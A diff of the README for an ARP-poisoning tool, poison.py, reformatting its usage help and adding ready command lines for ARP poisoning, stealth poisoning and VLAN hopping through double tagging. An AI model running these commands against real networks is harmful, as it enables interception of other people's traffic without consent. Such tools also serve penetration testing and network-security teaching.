@@ -7,33 +7,93 @@ Kevin Tan<br/><br/>
 
 
 ### Usage
- 
-python poison.py -h                 // Help Menu 
+####Help Menu 
+```
+python poison.py -h                 
+```
 
-python poison.py -l 192.168.1.0/24  // Shows all active host within the local network using ARP Broadcast
+####Shows all active host within the local network using ARP Broadcast
+```
+python poison.py -l 192.168.1.0/24  
+```
 
-python poison.py --stealth          // Prevents host machine from being discovered <br/><br/>
+####Prevents host machine from being discovered 
+```
+python poison.py --stealth
+```
 
-<To be used with -T, -M, -G, -TM, -MM, -GM> </br>
 
--P                                   // ARP poisoning mode without VLAN double tagging
+###Options Arguments
+ARP poisoning mode without VLAN double tagging<br>
+**\*To be used with -T, -M, -G**
+```
+python poison.py -P                                   
+```
+ARP poisoning mode with VLAN double tagging<br>
+**\*To be used with -T, -M, -G, -TM, -MM, -GM --vlan1 --vlan2**
+```
+python poison.py -PV
+```
 
--PV                                  // ARP poisoning mode with VLAN double tagging <br/><br/><br/>
+####Arguments Usage
+Specify target’s IP address
+```
+-T 192.168.10.10
+```
 
--T 192.168.10.10                     // Specify target’s IP address
+Specify monitoring PC IP address
+```
+-M 192.168.10.11
+```
 
--M 192.168.10.11                     // Specify monitoring PC IP address
+Specify gateway/target2 IP address
+```
+-G 192.168.10.1
+```
 
--G 192.168.10.1                      // Specify gateway/target2 IP address
+To specify target’s MAC address
+```
+-TM “AA:AA:AA:AA:AA:AA”
+```
 
--TM “AA:AA:AA:AA:AA:AA”              // To specify target’s MAC address
+Specify monitoring PC MAC address
+```
+-MM “BB:BB:BB:BB:BB:BB”
+```
 
--MM “BB:BB:BB:BB:BB:BB”              // Specify monitoring PC MAC address
+Specify gateway/target2 MAC address
+```
+-GM “CC:CC:CC:CC:CC:CC”
+```
 
--GM “CC:CC:CC:CC:CC:CC”              // Specify gateway/target2 MAC address
+To specify the first Dot1Q VLAN number
+```
+--vlan1 10
+```
 
---vlan1 10                           // To specify the first Dot1Q VLAN number
+To specify second Dot1Q VLAN number
+```
+--vlan2 20
+```
 
---vlan2 20                           // To specify second Dot1Q VLAN number
+
+###Attacks Usages
+####Nommal ARP Poisoning 
+```
+python poison.py -P -T 192.168.1.10 -M 192.168.1.148 -G 192.168.1.1
+```
+
+####Nommal ARP Poisoning with stealth 
+```
+python poison.py --stealth -P -T 192.168.1.10 -M 192.168.1.148 -G 192.168.1.1
+```
+
+####VLAN Hopping with ARP Poisoning (Native VLAN 10, Target VLAN 20)
+\* Requires Target MAC, Monitor MAC,Gateway MAC with vlan1 and vlan2
+
+```
+python poison.py -P -T 192.168.1.10 -M 192.168.1.148 -G 192.168.1.1 -TM "AA:AA:AA:AA:AA:AA" -MM "BB:BB:BB:BB:BB:BB" -GM "CC:CC:CC:CC:CC:CC" --vlan1 10 --vlan2 20
+```
+
 
                                                  
